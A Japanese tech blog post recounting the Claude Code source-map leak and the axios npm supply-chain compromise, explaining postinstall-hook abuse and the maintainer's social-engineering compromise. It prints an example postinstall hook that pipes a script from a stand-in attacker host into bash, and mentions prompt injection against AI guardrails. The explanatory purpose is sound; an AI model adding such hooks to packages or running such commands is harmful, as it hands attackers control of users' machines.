---
layout: post
title:  "ClaudeCodeのソースコード漏洩とaxiosの改ざんについて"
date:   2026-04-05 11:15:27 +0900
categories: diary
image:
  path: assets/img/claudecode-source-code-leak.png
 # Add image post (optional)
tags: [aws] # add tag
description: 新年度初日からあれやこれやと大忙し
---

4月1日はエイプリルフールということですが、初日からウソであってほしいニュースが（正確には1・2日前から）飛び交っていました。

[AnthropicのAIツール「Claude Code」でコード露出、ソースマップの誤混入で](https://www.itmedia.co.jp/news/articles/2604/01/news056.html)

Anthropicの人気AIツール（オープンソースではないので詳細は非公開です）ClaudeCodeのソースコードが漏洩したという事件がありました。開発用の人間が読めるコードをビルドすると、容量が小さくなり、かつ難読化されます。この「難読化された配布用コード」が、「元の人間が読める綺麗なコード」のどこに対応するかを記録したものがソースマップです。ソースマップが全体に公開されると、配布されたコードがもともとどういうプログラムで書かれていたのかがすぐ分かってしまいます。このバージョンはすぐに非公開にされましたが、その間世界中の人がダウンロードし、リバースエンジニアリングされ、ClaudeCodeの中身が明らかになりました。はやくもこんなプロジェクトが作られていたりします。

[流出したコードからClaude Codeの仕組みをすべて解析し知られざる機能を見やすくまとめた「Claude Code Unpacked」、未公開機能などをソースコードから直接マッピング](https://gigazine.net/news/20260402-claude-code-unpacked/)

今回Anthropicのソースコードが漏洩してしまったことで、利用する側にもいくつかのセキュリティリスクが考えられます。
私が最も懸念しているものの一つは、Anthropicすら気が付いていないプログラムのバグを突いたゼロデイ攻撃です。なにせこれだけ大人気のツールですから、一つセキュリティホールを見つけることができれば影響は甚大です。ClaudeCode自体のコードを改ざんすることはできませんが、「プロンプトインジェクション」という悪意ある命令をAIに与え、通常AIが拒否するような命令でも、ガードレールを突破してAIを誤作動させるセキュリティリスクがあります。

一方今回の一連のニュースの中で、非常に感銘を受けた投稿がありました。AnthropicのCEOであるBoris ChernyのXでのコメントです。

<blockquote class="twitter-tweet"><p lang="en" dir="ltr">Mistakes happen. As a team, the important thing is to recognize it’s never an individuals’s fault — it’s the process, the culture, or the infra.<br><br>In this case, there was a manual deploy step that should have been better automated. Our team has made a few improvements to the…</p>&mdash; Boris Cherny (@bcherny) <a href="https://twitter.com/bcherny/status/2039210700657307889?ref_src=twsrc%5Etfw">April 1, 2026</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

> ミスは起こります。チームとして重要なのは、それが決して個人のせいではないと認識することです — それはプロセスや文化、インフラの問題です。
>この場合、手動でのデプロイステップがあり、それがもっとうまく自動化されるべきでした。私たちのチームは次回のために自動化にいくつかの改善を加えました。もう少し改善が進行中です。

そして上記のポストに対する解説の投稿。

<blockquote class="twitter-tweet"><p lang="en" dir="ltr">At any other company, the person who just leaked 512,000 lines of source code, internal model codenames, and an entire product roadmap is clearing their desk by lunchtime.<br><br>Boris built Claude Code from a side project into $2.5B+ in annual revenue and 4% of all GitHub commits. His… <a href="https://t.co/sG2DWU7b8J">https://t.co/sG2DWU7b8J</a></p>&mdash; Aakash Gupta (@aakashgupta) <a href="https://twitter.com/aakashgupta/status/2039513156905828497?ref_src=twsrc%5Etfw">April 2, 2026</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

> ミスを犯したエンジニアを解雇する会社は、ただ1つの結果しか得られません：他のすべてのエンジニアが自分のミスを隠すことを学ぶのです。ニアミスは報告されなくなります。次の設定エラーは指摘される代わりに埋もれてしまいます。1つの公のインシデントと引き換えに、数十もの静かなインシデントが生まれるのです。
>Googleはこの考えを15年前にSREの教義として体系化しました。Google、Amazon、Microsoftのすべての主要な障害事後分析は、デフォルトで非非難方式で行われます。なぜなら、インシデント頻度の数学がそれが機能することを証明しているからです。エラーを罰するチームはエラー率が高く、エラーを計測するチームはそれが低いのです。
>Anthropicは今、業界のすべての競合他社に自社の全製品ロードマップを晒してしまいました。製品責任者の反応：プロセスのどこが壊れたか、ここに書きます。それを何で自動化するか、ここに書きます。それを防ぐために次に何をリリースするか、ここに書きます。
>それが、数十億ドル規模の製品を構築するエンジニアたちが、設定ファイル1つで解雇されない会社へ去ってしまうのを防ぐ方法です。

GoogleのSRE本は当然読んでいます。ミスを憎んで人を憎まず。間違いなく正しい言葉ですが、それがただのキレイごとや空想のモノとして終わらない現場がアメリカのITの世界にあります。AIのライバルであるGoogle、Amazon、Microsoftはインシデントの原因を人間個人に押し付けません。そういう企業文化があるからこそ、優秀なエンジニアが働いて、競争力を持つことができるのだ、と。

今回のClaudeCodeのソースコード漏洩と同日に、もう一つ大きなセキュリティ事故がありました。人気のHTTPクライアントライブラリ（漏洩したソースコードによると、ClaudeCodeでも利用されていたとのことです）である「axios」が改ざんされました。

[Axios NPMパッケージ侵害：週1億以上のダウンロードを誇るJavaScript HTTPクライアントにサプライチェーン攻撃](https://www.trendmicro.com/ja_jp/research/26/d/axios-npm-package-compromised.html)

このaxiosの改ざんニュースにはセキュリティ担当として知っておかなければならない2つの要素があります。1つは最近流行しているnpmの `postinstall` を使ったサプライチェーン攻撃について。もう1つは今回の改ざんを実行するに至ったあまりに巧妙なソーシャルエンジニアリングについてです。

まず、npmの設計思想として、「ライブラリをインストールした後、その環境に合わせてビルドしたり、必要なバイナリをダウンロードしたりする」という利便性が重視されています。この利便性が攻撃に悪用される事態がたびたび起きています。
通常、`package.json` には `scripts` という項目があります。攻撃者はここに `postinstall` というキーを追加（または上書き）します。

```json
{
  "name": "axios",
  "version": "1.14.1",
  "scripts": {
    "postinstall": "node ./dist/malicious-script.js"
  }
}
```

あるいは、もっと直接的にシェルコマンドを書き込むパターンもあります。

```json
"postinstall": "curl -s http://attacker-site.com/payload.sh | bash"
```

この一行があるだけで、ユーザーが `npm install axios` と実行した直後に、OSのシェル（ターミナル）上でそのコマンドが自動的に実行されてしまいます。昨年大量のライブラリへ自己増殖的に改ざん行為を行ったShai-Hulud（シャイ＝フルード）もこれを悪用しています。

今回のaxiosのケースで特に悪質だったのは、axios自身の `package.json` に直接怪しいコマンドを書くのではなく、**「偽の依存ライブラリ」**を経由させた点です。具体的には攻撃者が、axiosの依存関係（`dependencies`）に、自分が作った悪意のあるパッケージ（例: plain-crypto-js）をこっそり追加しました。この名前によく似た正規のライブラリがあるため、目視で気が付きにくくなっていました。
axiosをインストールすると、npmは芋づる式にその「偽ライブラリ」もインストールし、その「偽ライブラリ」側の `postinstall` にウイルス感染コードを仕込んでおく、という手法がとられました。こうすることで、axios本体の `scripts` 欄だけをチェックしている開発者の目を盗み、ウイルスを実行させることに成功しました。

このnpmの依存ライブラリ地獄（Dependency Hell）と自由度の高すぎる `postinstall` は業界でも問題になっています。特にnpm開発者がnpm（Node.js）の後悔を糧に作ったDenoでは、サンドボックスでの動作やインストール時に勝手にコードを実行する `postinstall` の廃止など、セキュリティの強化が図られています。世の中はよりセキュリティが強固なパッケージ管理システムへの移行を進めています。

もう一つ、なぜ今回axiosが改ざんされたのか。axiosのリポジトリ内のチャットで、実際に被害を受けてしまったメンテナーが以下のように経緯を説明しています。

https://github.com/axios/axios/issues/10636#issuecomment-4180237789

1.偽の身分と接触: 攻撃者は実在する企業の創設者を名乗り、その人物の顔写真やブランディングを悪用して、コラボレーションや会議の勧誘をメールで送りました。
2.偽のコミュニティへの招待: メンテナーは、その企業の社内通信を装った「偽のSlackワークスペース」に招待されました。そこには偽の社員プロフィールや、他の実在するオープンソース開発者のプロフィールが並んでおり、本物らしく見せかけていました。
3.「彼らは私との会議をスケジュールしました。会議はTeamsで行われる予定でした。会議（のリンクを開いたページ）で、私のシステムの一部が古くなっている（out of date）と表示されました。Teamsに関連するものだと思い込み、不足しているアイテムをインストールしましたが、それがRAT（遠隔操作用トロイの木馬）でした」
実際には、Teamsの正規サイトを模倣したフィッシングサイトで、「ドライバやアプリの更新が必要」という偽のポップアップを出し、メンテナーにウイルスを実行させたのです。

つまり、攻撃者はメンテナーのPC自体を遠隔操作したため、すでにログイン済みのセッションや認証情報をそのまま利用でき、2FAが設定されていても無効化または回避された状態でnpmへの公開権限を行使できたわけです。
コミュニティがGitHub上のIssueで異常を報告しても、攻撃者は乗っ取ったアカウントを使ってそれらのIssueを即座に削除することで発覚を遅らせたとされます。

今回の件が恐ろしいのは、**「axiosのコード自体に脆弱性があったわけではない」**という点です。
どんなに強固なセキュリティでも、メンテナーが「自分のPCで」「正規の権限を使って」悪意のあるコードをアップロードしてしまえば意味がありません。攻撃者はメンテナーのPCそのものを遠隔操作したため、物理的なトークンやスマホでの認証さえも、ログイン済みのセッションを盗用することで突破しました。偽物のSlack、本物に似せたTeamsの画面など、国家レベルの犯罪組織が裏にいるのでは、と言われています。

新年度早々大きなセキュリティのニュースが世の中を騒がせ、会社でも状況の調査、対応の検討などたいへん忙しい一週間でした。